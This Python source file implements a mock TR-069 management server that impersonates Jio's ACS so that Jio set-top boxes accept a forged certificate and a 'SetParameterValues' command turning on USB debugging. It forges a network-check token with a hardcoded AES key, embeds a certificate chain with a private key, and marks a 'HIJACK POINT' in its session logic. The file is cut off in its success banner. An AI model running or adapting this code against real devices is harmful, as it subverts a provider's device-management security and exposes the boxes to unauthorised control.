import ssl
import socket
import threading
import datetime
import os
import re
import base64
import uuid
import hashlib
import http.client
import traceback
import sys

# ==============================================================================
# JIO STB STANDALONE MOCK ACS SERVER (DUAL-VARIANT: RELAY + OFFLINE STANDALONE)
# ==============================================================================

# --- Netcheck Bypass ---
try:
    from Crypto.Cipher import AES
    _HAVE_AES = True
except Exception:
    _HAVE_AES = False

NETCHECK_KEY = b"6bm2I7pTdBaeABX0"
NETTYPE = "FTTH"
_PRECOMPUTED_NETCHECK = "UzLgdFHvJkBfRQiHnNQit+55dub3o1PbxIhuNZ7oJc8="

def _forge_netcheck():
    if not _HAVE_AES: return _PRECOMPUTED_NETCHECK
    iv = os.urandom(16)
    data = NETTYPE.encode()
    pl = 16 - (len(data) % 16)
    data += bytes([pl]) * pl
    ct = AES.new(NETCHECK_KEY, AES.MODE_CBC, iv).encrypt(data)
    return base64.b64encode(iv + ct).decode()

# --- CWMP Payloads ---
INFORM_RESPONSE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<soap-env:Envelope xmlns:soap-enc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:soap-env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<soap-env:Header><cwmp:ID soap-env:mustUnderstand="1">{ID}</cwmp:ID></soap-env:Header>
<soap-env:Body><cwmp:InformResponse><MaxEnvelopes>1</MaxEnvelopes></cwmp:InformResponse></soap-env:Body>
</soap-env:Envelope>"""

SET_PARAMS_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<soap-env:Envelope xmlns:soap-enc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:soap-env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<soap-env:Header><cwmp:ID soap-env:mustUnderstand="1">{ID}</cwmp:ID></soap-env:Header>
<soap-env:Body><cwmp:SetParameterValues>
<ParameterList soap-enc:arrayType="cwmp:ParameterValueStruct[1]">
<ParameterValueStruct><Name>Device.JioSTB.USB.USBDebugging</Name><Value xsi:type="xsd:boolean">true</Value></ParameterValueStruct>
</ParameterList>
<ParameterKey></ParameterKey>
</cwmp:SetParameterValues></soap-env:Body>
</soap-env:Envelope>"""

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

EMBEDDED_ACS_CHAIN = """-----BEGIN CERTIFICATE-----
MIIDdzCCAl+gAwIBAgIUMvrJxgaHZjs+5Q3OW8IbPrXy91gwDQYJKoZIhvcNAQEL
BQAwPTEYMBYGA1UEAwwPYWNzLm9zcy5qaW8uY29tMSEwHwYDVQQKDBhKaW8gQUNT
IChsb2NhbCByZWRpcmVjdCkwHhcNMjYwODAyMDg1MzI0WhcNMzYwNzMwMDg1MzI0
WjA9MRgwFgYDVQQDDA9hY3Mub3NzLmppby5jb20xITAfBgNVBAoMGEppbyBBQ1Mg
KGxvY2FsIHJlZGlyZWN0KTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
AMCyPT76CO0uYi8UUAPFn9xXXAVBpLy+V1Q8NNPtxr6Mc8piWthmQtHb+lvpY9S0
muSUsCNzKWtZHAN0LzoGxTGpG78xilg2X5iT2vx5S07lB4qosUsKixvMIe6ztNmL
ppxMlAb2qgpJFcsEfzaOsX4sH33a3BbCVyyX0VHAIq7Cv0qrokeDnOPUzyKD5I+J
+k5TrMAJ5V0bHadCDNlujDGfSBJwpeBuyg0RE5wXj9TsjOJlcoEwtPXT/14T/iUE
c2FIKi/b9E9mQMq75u/zBnvJP0CCY/XAE9tQnSK5CzB0jcPNxhonn/rhxWNmn6Za
970vCb5enAp26fC6xs10JT0CAwEAAaNvMG0wHQYDVR0OBBYEFKLBPmXISOkzyM3I
iJ8g8Jmc/mJjMB8GA1UdIwQYMBaAFKLBPmXISOkzyM3IiJ8g8Jmc/mJjMA8GA1Ud
EwEB/wQFMAMBAf8wGgYDVR0RBBMwEYIPYWNzLm9zcy5qaW8uY29tMA0GCSqGSIb3
DQEBCwUAA4IBAQAEhNZ8hRvTtE4vdsdvP4g6vqaL1jf4TS+5jGe3bbhfKHhtrX/h
dxrx4/PxjqdAQApdyrl6T3iojGMGof7OEMiBzn+bXAZutuzmXLi1kVpg6wVaPOcK
9sI6lz2NlSKNIFQ3dh0xSX7jhlFXpZKaKY3b6Uo6kyk06YzRnRzR5jFaq9lDcB71
i5TbeRQ6/roPxTibX6rfiVd8Ivwu++Sovb1xrCeWKDdDnvAD/g2I3JHXM3Kyb0Dg
Ib3xBVhdkmUqFFD78g1pOqI18kjXE6QwD1rf52QTNhXwjN5rM5spq+ckbmHg2XB6
y49nXSVONivZF15ZNoLVTnIglUc6SN1513Sd
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIIFKDCCAxCgAwIBAgIQSHtGpaAd75dFQUroilKc6DANBgkqhkiG9w0BAQsFADAU
MRIwEAYDVQQDEwlSSUxST09UQ0EwHhcNMDkxMDE0MjA1NzU3WhcNMzYxMDE4MTIw
OTEwWjAUMRIwEAYDVQQDEwlSSUxST09UQ0EwggIiMA0GCSqGSIb3DQEBAQUAA4IC
DwAwggIKAoICAQDBgLp5wP9pEshr90yJNaVPM+5jhCDkW8zHcZl9jFBB97IEEwpc
Ejb3gKEU++p1iBR8N/RbYlJ6hXVpqIBoppuWbOVBDgnjl65abQRPs6eGcvVS5s56
V3l9uHVAZo3Ug23SaTwxqliJ4zkqdLZ0UjX51wyjAc6SLODWG8INKmaZCB36nSq7
g2pXPgYGBuKvDlMpNSd1/Kto8t4CT2ovGA6P+6HmVyeKpexNFz1f0nFhNbBmz4Z5
2YLBQ10X7VCRF8XYenVIx8SSmGYE0uPT3RBQmQ11hAVpi1XnkXsXiBlS/zxQIICu
5O7uBKH6f9233vCzTKHRRwr3vJoN2npw134eAJDIc1Vc1Z1KYY1LLDKw/8Q1I07s
a71APjzCZQs+qsiwLeilknZ56GajyfTMcouyNSfl7/weU9DIoA2XPg5k1eDU3N/R
ZCoTgnHlOVj8yGSZ2MJT1nyCEkgJDU1rYefUNIetGRlsZIToO6L0btmpS807q1Kw
7ObIJE6XwwIM9gL8wb4Hm2vM+t2oTYDTI68I9GpHjxunO3xywVIjPRvFt+q5n3+d
UjV6gzsc6rYQgm5RvAmpTftB8thyzKXmMncYkMWYQWGNmaK4mPiTx+GIwmpUvGNq
7iCpwRCd04RbQKXMJtz0ZFvuZ74+7732v4kXnB1MbkYw5VxZv88T9SFCCQIDAQAB
o3YwdDALBgNVHQ8EBAMCAYYwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUNo1s
aOPHEzOB/A+XIti3zDtm+Z8wEAYJKwYBBAGCNxUBBAMCAQEwIwYJKwYBBAGCNxUC
BBYEFKf9WI5kbKmQhtdLG6c2XrEOR2+WMA0GCSqGSIb3DQEBCwUAA4ICAQC+wWY9
Lpu6kXuw+pyNLMK7w6BRbXI/RJvMyt+W2fuYnFwT5UbTlXCMH8xY3Buv1TthvQNF
Y0aXGT1n6JtbeDGgZlcJ4utcb0aZlLtr2k0uN0klgMvIZupB43PMhmbsnLn2WQI+
+sF07HeQlGrMWaUirm7pCOXueiyl/oWzJE+nf0wepY+nAXeav+pqQzmcYP9HAcEG
7vBrzRzgHKhqnEA9KskrTYnGkKHnF5GIm6KBT4ee5u18sZrkYQHt6/C+xg1TaWY4
R24XgwVMwADOP8pNTZxxs8iSGvzijQXlHyePkbv/5eblAnmxiBVf+AtksIwbq1qE
f0VL7zqzuaGVe1joKen/4Ol16ijt2EKLxnz5Q+j63eV6zJNfgGThoRR7SXsG3Kg+
tBJsTLU4SUhP/1B8RNFgGifvb4c31J+/AhLuIBE25AQQtM16Rupd86Mqn//BRpjx
0WsHmCOJ1cJ0m+eSxtMFl9GOUb+34jkKeJyTNeC7n51RuJp8VoRzJoyxNBlHMeZh
5/jAJB/KdFdzI1zi7E19/3Fd2mtuSmnMM8my9/4IF/V9sIfKnlx7kzJnabOe45sE
vi5fdmBaetXIHKxdoZrWv7Xw4wEdPTGW5w9xr4Y2VQdKKEOZ2FEzwbdYQUUSmroE
5zjshNPn9H8tg1CNim+/4MvwgQLTJz2u+P2G1w==
-----END CERTIFICATE-----
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDAsj0++gjtLmIv
FFADxZ/cV1wFQaS8vldUPDTT7ca+jHPKYlrYZkLR2/pb6WPUtJrklLAjcylrWRwD
dC86BsUxqRu/MYpYNl+Yk9r8eUtO5QeKqLFLCosbzCHus7TZi6acTJQG9qoKSRXL
BH82jrF+LB992twWwlcsl9FRwCKuwr9Kq6JHg5zj1M8ig+SPifpOU6zACeVdGx2n
QgzZbowxn0gScKXgbsoNEROcF4/U7IziZXKBMLT10/9eE/4lBHNhSCov2/RPZkDK
u+bv8wZ7yT9AgmP1wBPbUJ0iuQswdI3DzcYaJ5/64cVjZp+mWve9Lwm+XpwKdunw
usbNdCU9AgMBAAECggEAKxNdHhgiSTUCdVBG38T8irLLqxAkzZ2GI5ou3AZOFJgM
pVwNv0zC2KtiYMwASVMTQhBb/Jy4kFrz6HC/QuszBzosrfWa3cPP5Gl+/Uv3Efyg
TjaOJX6GoNDl7/ijr7LobI2w1Iqs8c4rLT5E2tMUqeYepxF2/C528szAWdRH3IVg
hRHzyc6yH/IemNJw7Zvg9LO0ew1RtBBHSCu68O+sLGB/s4UQTa3fSPXPHTuEPIKD
VUjzdZeFpwb9mSXLe38r41XSeILxRMord1vEi8jmV5AQEo1oYomC72kSfm8vuzAG
BZTjoBpNnJfnI9jfVsGvl2bioKsfQ3xRV8xnmjCZiQKBgQDmMQ0ONpDgDht5dUTI
WdUOTQ+M4qCJL0KCq3Z+1Yf8ayaGPq6EWMvGxGGsyTMHE6hzd/85pOwY6bcsEHst
LPlFx/SdVL5uzG84/EqrUfsY19L5vvUHwj2yDoV1pVau+lw6XwY/Tw2PcCrHvkeG
aa8rKfkXtqHx/0usZcaqgpkIaQKBgQDWTP+IFCwlR4vHaHEK3amWu/lfFgkYWvtn
RjMc8jXiJtagbNOsd3CH4ED/vA5fQyETPxWzl+n8DbV/s0EhA0AoQZA5RF9CMoCN
NSWKhT07lHtKb6VcqBA6gsTN2PZ9Wmf4FLXSV8Gp6xI11T60u4CIEhYTlprx3D2j
ppNm3ak7tQKBgCNJFZU+LAsMXo3Juhd0HcKpcV7JRo6A3hMlsW5T0RqSWj9t0Fad
Pe9kHwzbcqT9EG9Sz57IdyCCgv+QLzGHmVZnBkovuVlGoS39Dn0gffsa6k46RVlB
Hy/yJecYxybfXc/czRpbRdrc+NHRiylBfgaB0psd9ckgtzrgBwoQJuExAoGBAKg5
bWZvH3BsR4fTrtluxA/1o35HGACseynI65rPcAkFn/nzM/7xC78+BQg7obSaR76K
CQkgOaeJQ27pUjkOCjEPtp2d1IFsj4lJrRyeF0FL/7ShC9g+fe7QdJl6tZQVggQ2
jbx+8yHlzDfCHCVYAz/NotLhqOQvlZt/ybo4Sv75AoGBAJ7bUxN/XwoaBIYvl2Ed
+mdCcX6JRXzV5cCJuLVPeEVSWvEj0iACSM7GRkQEFevC+WYt/iZXSQ6Qwg3umYUi
dKeELuqgFna+aS/D5vyg6b2BX31LX35n0WOqeklecMMv9FaGvSSjsBf7OEf51rCP
tuABhXzyODVQ6JdLhzO3+6Jb
-----END PRIVATE KEY-----"""

# Certificate selection (Dual Family Support: JMS vs JHS):
# - JMS Series (JMSD200A, JMSC200A): Pins CN=RILROOTCA (acs_chain.pem)
# - JHS Series (JHSD200, JHSC200): Validates via Android system store (forged_chain.pem eMudhra)
import argparse
_parser = argparse.ArgumentParser(add_help=False)
_parser.add_argument("--cert", type=str, default=None)
_parser.add_argument("--model", type=str, default="auto", choices=["auto", "jms", "jhs"])
_cli_args, _ = _parser.parse_known_args()

_model_env = os.environ.get("STB_MODEL", "auto").lower()
TARGET_MODEL = _cli_args.model if _cli_args.model != "auto" else _model_env

if _cli_args.cert and os.path.exists(_cli_args.cert):
    CERT_FILE = os.path.abspath(_cli_args.cert)
elif TARGET_MODEL == "jhs":
    CERT_FILE = os.path.join(BASE_DIR, "forged_chain.pem")
    if not os.path.exists(CERT_FILE):
        CERT_FILE = os.path.join(BASE_DIR, "acs_chain.pem")
else:
    # Default: JMS series (acs_chain.pem with RILROOTCA)
    CERT_FILE = os.path.join(BASE_DIR, "acs_chain.pem")
    if not os.path.exists(CERT_FILE):
        try:
            with open(CERT_FILE, "w", encoding="utf-8") as f:
                f.write(EMBEDDED_ACS_CHAIN)
        except Exception:
            if os.path.exists(os.path.join(BASE_DIR, "forged_chain.pem")):
                CERT_FILE = os.path.join(BASE_DIR, "forged_chain.pem")
# TR-069 standard CWMP ports.
# Note: Port 443 is disabled by default to completely block 3rd-party Android app SSL noise.
PORTS = [7443, 7547, 8080, 8443, 9443]
if "--listen-443" in sys.argv or os.environ.get("LISTEN_443", "").lower() in ("1", "true", "yes"):
    PORTS.append(443)
BIND_ADDR = "0.0.0.0"

LOG_FILE = os.path.join(BASE_DIR, "mock_acs.log")
PACKET_LOG_FILE = os.path.join(BASE_DIR, "mock_acs_packets.log")

# Exact Real Jio ACS Digest Parameters:
REALM = "CPEDigestLogin"
OPAQUE = "145074cc9f9b8670f412d297d1d11274"  # MD5("CPEDigestLogin")

# Upstream details for Relay Mode
REAL_ACS_HOST = "acs.oss.jio.com"
REAL_ACS_PORT = 8443
REAL_ACS_IP = "49.40.134.113"

UPSTREAM_ONLINE = False
upstream_ctx = ssl._create_unverified_context()
try: upstream_ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
except Exception: pass

SESSIONS = {}
SESSIONS_LOCK = threading.Lock()
loglock = threading.Lock()

def log(m, to_stdout=True):
    """High-level operational logging for terminal and mock_acs.log."""
    with loglock:
        try:
            line = f"[{datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {m}"
            if to_stdout:
                print(line, flush=True)
            with open(LOG_FILE, "a", encoding="utf-8") as lf:
                lf.write(line + "\n")
        except Exception:
            pass

def log_packet(direction, cid, line, headers, body=None, note=""):
    """
    Comprehensive network packet analyzer logging.
    Dumps full HTTP request/response headers and XML/JSON payload in plaintext.
    """
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    entry = [
        "=" * 80,
        f"[{ts}] [{direction}] Client: {cid}{f'  ({note})' if note else ''}",
        line,
        "-" * 40,
        "Headers:"
    ]
    if isinstance(headers, dict):
        for k, v in headers.items():
            entry.append(f"  {k}: {v}")
    elif isinstance(headers, list):
        for k, v in headers:
            entry.append(f"  {k}: {v}")
    
    if body:
        entry.append("-" * 40)
        entry.append(f"Payload ({len(body)} bytes):")
        try:
            if isinstance(body, bytes):
                body_txt = body.decode("utf-8", errors="replace")
            else:
                body_txt = str(body)
            entry.append(body_txt)
        except Exception:
            entry.append(f"<binary data {len(body)} bytes>")
    else:
        entry.append("-" * 40)
        entry.append("Payload: <empty body>")
    entry.append("=" * 80 + "\n")
    
    log_text = "\n".join(entry)
    with loglock:
        try:
            with open(PACKET_LOG_FILE, "a", encoding="utf-8") as pf:
                pf.write(log_text)
        except Exception:
            pass

def test_upstream_connectivity(timeout=2.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((REAL_ACS_IP, REAL_ACS_PORT))
        s.close()
        return True
    except Exception:
        return False

def forward_to_real_acs(method, path, headers, body, timeout=4.0):
    forward_headers = {k: v for k, v in headers.items() if k not in ("host", "connection", "content-length")}
    forward_headers["host"] = REAL_ACS_HOST
    forward_headers["content-length"] = str(len(body))
    forward_headers["connection"] = "keep-alive"
    
    conn = http.client.HTTPSConnection(REAL_ACS_IP, REAL_ACS_PORT, context=upstream_ctx, timeout=timeout)
    conn.request(method, path, body=body, headers=forward_headers)
    resp = conn.getresponse()
    resp_body = resp.read()
    return resp.status, resp.reason, resp.getheaders(), resp_body

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(CERT_FILE)
try: ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
except Exception: pass

def parse_cookie(headers):
    cookie_header = headers.get("cookie", "")
    if not cookie_header: return None
    m = re.search(r'(?:JSESSIONID|session)=([0-9a-zA-Z._-]+)', cookie_header)
    return m.group(1) if m else None

def extract_auth_params(auth_str):
    params = {}
    if not auth_str: return params
    for m in re.finditer(r'(\w+)=(?:"([^"]+)"|([^\s,]+))', auth_str):
        k = m.group(1).lower()
        v = m.group(2) if m.group(2) is not None else m.group(3)
        params[k] = v
    return params

def extract_device_info(body_str):
    info = {}
    patterns = {
        "Manufacturer": r'<Manufacturer[^>]*>([^<]+)</Manufacturer>',
        "ProductClass": r'<(?:ProductClass|ModelName)[^>]*>([^<]+)</(?:ProductClass|ModelName)>',
        "SerialNumber": r'<SerialNumber[^>]*>([^<]+)</SerialNumber>',
        "HardwareVersion": r'<HardwareVersion[^>]*>([^<]+)</HardwareVersion>',
        "SoftwareVersion": r'<SoftwareVersion[^>]*>([^<]+)</SoftwareVersion>',
    }
    for k, p in patterns.items():
        m = re.search(p, body_str)
        if m: info[k] = m.group(1).strip()
    return info

def get_http_date():
    return datetime.datetime.now(datetime.timezone.utc).strftime("%a, %d %b %Y %H:%M:%S GMT")

def read_http(rf):
    try:
        line = rf.readline()
        if not line: return None
        reqline = line.decode("latin1").rstrip("\r\n")
        headers = {}
        while True:
            h = rf.readline()
            if not h or h in (b"\r\n", b"\n"): break
            k, _, v = h.decode("latin1").partition(":")
            headers[k.strip().lower()] = v.strip()
        body = b""
        if "content-length" in headers:
            n = int(headers["content-length"])
            body = rf.read(n) if n else b""
        return reqline, headers, body
    except Exception:
        return None

def handle(conn, addr):
    try:
        srv_port = conn.getsockname()[1]
    except Exception:
        srv_port = "?"
    is_tr069_port = srv_port in (8443, 9443, 7443, 7547)
    cid = f"{addr[0]}:{addr[1]} [:{srv_port}]"
    log(f"TCP connect from {cid}", to_stdout=is_tr069_port)
    try:
        s = ctx.wrap_socket(conn, server_side=True)
        log(f"TLS ok {cid}", to_stdout=is_tr069_port)
    except Exception as e:
        if is_tr069_port:
            log(f"TLS fail {cid}: {type(e).__name__}: {e}", to_stdout=True)
            if "CERTIFICATE_UNKNOWN" in str(e):
                if "forged_chain" in os.path.basename(CERT_FILE):
                    log(f"{cid} [!] STB TR-069 rejected eMudhra cert. If this is a JMS box (JMSD200A/JMSC200A), run in JMS mode ('acs_chain.pem' RILROOTCA)!", to_stdout=True)
                else:
                    log(f"{cid} [!] STB TR-069 rejected RILROOTCA cert. If this is a JHS box (JHSD200/JHSC200), run in JHS mode ('forged_chain.pem' eMudhra)!", to_stdout=True)
        else:
            # 3rd-party Android app (Google services, Jio ads, analytics) probed port 443 with public CAs.
            # Log quietly to mock_acs.log so user terminal stdout remains clean and readable.
            log(f"TLS fail {cid}: {type(e).__name__}: {e} (3rd-party app hit port {srv_port} - normal & ignored)", to_stdout=False)
        try: conn.close()
        except: pass
        return

    rf = s.makefile("rb")
    conn_sess = None
    has_challenged = False
    try:
        while True:
            req = read_http(rf)
            if req is None:
                log(f"{cid} closed by peer", to_stdout=is_tr069_port)
                break
            
            reqline, headers, body = req
            path = reqline.split(" ")[1] if len(reqline.split(" ")) > 1 else ""
            body_str = body.decode('utf-8', errors='ignore')
            cookie = parse_cookie(headers)
            has_auth = "authorization" in headers
            
            log_packet("INCOMING", cid, reqline, headers, body, note="CWMP Request from STB")
            show_in_console = is_tr069_port or ("network/check" in path) or ("request_account" in path)
            log(f"{cid} >>> {reqline} clen={len(body)} cookie={cookie or 'NONE'}{' [AUTH]' if has_auth else ''}", to_stdout=show_in_console)
            
            # ---- NETWORK CHECK BYPASS ----
            if "network/check" in path:
                nb = ('{"Network":"%s"}' % _forge_netcheck()).encode()
                date_hdr = get_http_date().encode()
                resp_headers = {
                    "Server": "nginx/1.30.1",
                    "Date": date_hdr.decode(),
                    "Content-Type": "application/json",
                    "Content-Length": str(len(nb)),
                    "Connection": "keep-alive"
                }
                resp = (
                    b"HTTP/1.1 200 OK\r\n"
                    b"Server: nginx/1.30.1\r\n"
                    b"Date: " + date_hdr + b"\r\n"
                    b"Content-Type: application/json\r\n"
                    b"Content-Length: " + str(len(nb)).encode() + b"\r\n"
                    b"Connection: keep-alive\r\n\r\n" + nb
                )
                s.sendall(resp)
                log(f"{cid} <<< netcheck bypass")
                log_packet("OUTGOING", cid, "HTTP/1.1 200 OK", resp_headers, nb, note="Network Check Bypass Response")
                continue
            
            # ---- HTTP DIGEST AUTH CHALLENGE ----
            is_bluebank = any(b in body_str.lower() for b in ["bluebank", "jhsd", "jhsc", "jhsb", "iwedia"])
            
            if not has_auth and not has_challenged and is_bluebank and ("cwmp:Inform" in body_str or len(body) > 0):
                has_challenged = True
                relayed_401 = False
                
                # VARIANT 1: Relay from Real Jio ACS if online
                if UPSTREAM_ONLINE:
                    try:
                        log(f"{cid} [RELAY] Forwarding Inform to Real Jio ACS for genuine 401 challenge...")
                        status, reason, resp_headers_list, resp_body = forward_to_real_acs("POST", path, headers, body)
                        if status == 401:
                            out = [f"HTTP/1.1 {status} {reason}"]
                            for k, v in resp_headers_list:
                                if k.lower() in ("transfer-encoding", "connection"): continue
                                out.append(f"{k}: {v}")
                            out.append(f"Content-Length: {len(resp_body)}")
                            out.append("Connection: keep-alive")
                            challenge_resp = ("\r\n".join(out) + "\r\n\r\n").encode("latin1") + resp_body
                            s.sendall(challenge_resp)
                            log(f"{cid} <<< [RELAY] Relayed authentic 401 Digest Challenge from Real Jio ACS")
                            log_packet("OUTGOING", cid, f"HTTP/1.1 {status} {reason}", dict(resp_headers_list), resp_body, note="Relayed 401 Challenge from Real ACS")
                            relayed_401 = True
                            continue
                    except Exception as e:
                        log(f"{cid} [WARN] Upstream relay failed ({e}), falling back to local 401 challenge")
                
                # VARIANT 2: Offline Standalone Fallback with verified MD5 hash
                if not relayed_401:
                    nonce = str(uuid.uuid4())
                    jsession = uuid.uuid4().hex + ".nvmbdprv126605"
                    body_401 = b"<html><head><title>Error</title></head><body>Unauthorized</body></html>"
                    date_hdr = get_http_date().encode()
                    resp_headers = {
                        "Server": "nginx/1.30.1",
                        "Date": date_hdr.decode(),
                        "Content-Type": "text/html;charset=UTF-8",
                        "Content-Length": str(len(body_401)),
                        "Connection": "keep-alive",
                        "WWW-Authenticate": f'Digest realm="{REALM}", qop="auth", nonce="{nonce}", opaque="{OPAQUE}"',
                        "X-Powered-By": "Undertow/3",
                        "Set-Cookie": f"JSESSIONID={jsession}; path=/"
                    }
                    challenge_resp = (
                        b"HTTP/1.1 401 Unauthorized\r\n"
                        b"Server: nginx/1.30.1\r\n"
                        b"Date: " + date_hdr + b"\r\n"
                        b"Content-Type: text/html;charset=UTF-8\r\n"
                        b"Content-Length: " + str(len(body_401)).encode() + b"\r\n"
                        b"Connection: keep-alive\r\n"
                        b'WWW-Authenticate: Digest realm="' + REALM.encode() + b'", qop="auth", nonce="' + nonce.encode() + b'", opaque="' + OPAQUE.encode() + b'"\r\n'
                        b"X-Powered-By: Undertow/3\r\n"
                        b"Set-Cookie: JSESSIONID=" + jsession.encode() + b"; path=/\r\n\r\n"
                        + body_401
                    )
                    s.sendall(challenge_resp)
                    log(f"{cid} <<< [OFFLINE] 401 Digest Challenge (realm={REALM}, nonce={nonce[:8]}..., opaque={OPAQUE[:8]}...)")
                    log_packet("OUTGOING", cid, "HTTP/1.1 401 Unauthorized", resp_headers, body_401, note="Local Standalone 401 Challenge (Fallback)")
                    continue

            # ---- CWMP: INFORM ----
            if "cwmp:Inform" in body_str:
                m = re.search(r'<cwmp:ID[^>]*>([^<]+)</cwmp:ID>', body_str)
                req_id = m.group(1).strip() if m else "0"
                
                dev_meta = extract_device_info(body_str)
                dev_desc = " ".join([f"{k}={v}" for k, v in dev_meta.items() if v]) or "Unknown"
                log(f"{cid} [INFORM] Device Info: {dev_desc}")
                
                if has_auth:
                    auth_params = extract_auth_params(headers.get("authorization", ""))
                    user_str = auth_params.get("username", "unknown")
                    uri_str = auth_params.get("uri", "")
                    nc_str = auth_params.get("nc", "")
                    log(f"{cid} [AUTH] Client authenticated via HTTP Digest: username='{user_str}', uri='{uri_str}', nc={nc_str}")

                session_id = uuid.uuid4().hex
                jsession_cookie = session_id + ".nvmbdprv126605"
                dev_model_name = dev_meta.get("model") or "Jio STB"
                conn_sess = {"state": "inform_sent", "model": dev_model_name, "adb_unlocked": False}
                with SESSIONS_LOCK:
                    SESSIONS[jsession_cookie] = conn_sess
                    SESSIONS[session_id] = conn_sess
                    if cookie:
                        SESSIONS[cookie] = conn_sess
                
                relayed_inform = False
                # VARIANT 1: Relay authenticated Inform to Real Jio ACS
                if UPSTREAM_ONLINE and has_auth:
                    try:
                        log(f"{cid} [RELAY] Forwarding authenticated Inform to Real Jio ACS...")
                        status, reason, resp_headers_list, resp_body = forward_to_real_acs("POST", path, headers, body)
                        if status == 200:
                            out = [f"HTTP/1.1 {status} {reason}"]
                            for k, v in resp_headers_list:
                                if k.lower() in ("transfer-encoding", "connection"): continue
                                out.append(f"{k}: {v}")
                            out.append(f"Content-Length: {len(resp_body)}")
                            out.append("Connection: keep-alive")
                            s.sendall(("\r\n".join(out) + "\r\n\r\n").encode("latin1") + resp_body)
                            log(f"{cid} <<< [RELAY] Relayed authentic 200 OK InformResponse from Real Jio ACS")
                            log_packet("OUTGOING", cid, f"HTTP/1.1 {status} {reason}", dict(resp_headers_list), resp_body, note="Relayed InformResponse from Real ACS")
                            relayed_inform = True
                            continue
                    except Exception as e:
                        log(f"{cid} [WARN] Upstream Inform relay failed ({e}), using local InformResponse fallback")
                
                # VARIANT 2: Offline Standalone InformResponse
                if not relayed_inform:
                    resp_xml = INFORM_RESPONSE_TEMPLATE.format(ID=req_id).encode("utf-8")
                    date_hdr = get_http_date().encode()
                    resp_headers = {
                        "Server": "nginx/1.30.1",
                        "Date": date_hdr.decode(),
                        "Content-Type": "text/xml; charset=utf-8",
                        "Content-Length": str(len(resp_xml)),
                        "Set-Cookie": f"JSESSIONID={jsession_cookie}; path=/",
                        "Connection": "keep-alive"
                    }
                    http_resp = (
                        b"HTTP/1.1 200 OK\r\n"
                        b"Server: nginx/1.30.1\r\n"
                        b"Date: " + date_hdr + b"\r\n"
                        b"Content-Type: text/xml; charset=utf-8\r\n"
                        b"Content-Length: " + str(len(resp_xml)).encode() + b"\r\n"
                        b"Set-Cookie: JSESSIONID=" + jsession_cookie.encode() + b"; path=/\r\n"
                        b"Connection: keep-alive\r\n\r\n" + resp_xml
                    )
                    s.sendall(http_resp)
                    log(f"{cid} <<< [OFFLINE] InformResponse [cookie={jsession_cookie[:16]}...]")
                    log_packet("OUTGOING", cid, "HTTP/1.1 200 OK", resp_headers, resp_xml, note="Local Standalone InformResponse")
                    continue
            
            # ---- CWMP: STATE MACHINE & SESSION HIJACK ----
            sess = SESSIONS.get(cookie) if cookie else conn_sess
            if sess:
                if sess["state"] == "inform_sent":
                    log(f"{cid} [HIJACK POINT] STB ready for commands -> Injecting local SetParameterValues (USBDebugging=true)")
                    cmd_id = "1" + uuid.uuid4().hex[:15]
                    resp_xml = SET_PARAMS_TEMPLATE.format(ID=cmd_id).encode("utf-8")
                    sess["state"] = "params_sent"
                    date_hdr = get_http_date().encode()
                    resp_headers = {
                        "Server": "nginx/1.30.1",
                        "Date": date_hdr.decode(),
                        "Content-Type": "text/xml; charset=utf-8",
                        "Content-Length": str(len(resp_xml)),
                        "Connection": "keep-alive"
                    }
                    http_resp = (
                        b"HTTP/1.1 200 OK\r\n"
                        b"Server: nginx/1.30.1\r\n"
                        b"Date: " + date_hdr + b"\r\n"
                        b"Content-Type: text/xml; charset=utf-8\r\n"
                        b"Content-Length: " + str(len(resp_xml)).encode() + b"\r\n"
                        b"Connection: keep-alive\r\n\r\n" + resp_xml
                    )
                    s.sendall(http_resp)
                    log(f"{cid} <<< SetParameterValues (USBDebugging=true) id={cmd_id}")
                    log_packet("OUTGOING", cid, "HTTP/1.1 200 OK", resp_headers, resp_xml, note="CWMP SetParameterValues")
                    continue
                
                elif sess["state"] == "params_sent":
                    if "SetParameterValuesResponse" in body_str:
                        sess["adb_unlocked"] = True
                        log(f"{cid} *** SUCCESS! STB ACCEPTED! ADB ENABLED! ***")
                    else:
                        log(f"{cid} *** WARN: unexpected response ***")
                    
                    date_hdr = get_http_date().encode()
                    resp_headers = {
                        "Server": "nginx/1.30.1",
                        "Date": date_hdr.decode(),
                        "Connection": "keep-alive"
                    }
                    s.sendall(
                        b"HTTP/1.1 204 No Content\r\n"
                        b"Server: nginx/1.30.1\r\n"
                        b"Date: " + date_hdr + b"\r\n"
                        b"Connection: keep-alive\r\n\r\n"
                    )
                    log(f"{cid} <<< 204 session closed (waiting for next)")
                    log_packet("OUTGOING", cid, "HTTP/1.1 204 No Content", resp_headers, None, note="CWMP Session Closed")

                    if sess.get("adb_unlocked"):
                        dev_model = sess.get("model", "Jio STB")
                        banner = f"""
======================================================================
  🎉🎉🎉 SUCCESS: JIO STB ADB IS FULLY UNLOCKED! 🎉🎉🎉
======================================================================
  Device: {dev_model} (Target IP: 192.168.50.2:5555)

  ACTION REQUIRED ON YOUR TV SCREEN RIGHT NOW:
  1. Turn on your TV screen.
  2. A popup dialog will appear: "Allow USB debugging?".
  3. Check "Always allow from this computer" with your remote.
  4. Select "Allow" / "OK".

  NEXT STEP:
